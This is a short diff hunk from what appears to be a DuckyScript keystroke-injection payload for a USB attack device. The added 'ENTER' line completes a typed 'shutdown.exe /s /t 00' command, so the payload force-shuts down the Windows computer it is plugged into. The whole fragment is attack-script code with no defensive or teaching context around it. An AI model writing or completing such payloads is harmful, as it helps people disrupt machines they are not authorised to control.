@@ -9,6 +9,7 @@ DELAY 1000
 ENTER
 DELAY 500
 STRING shutdown.exe /s /t 00
+ENTER
 
 
 
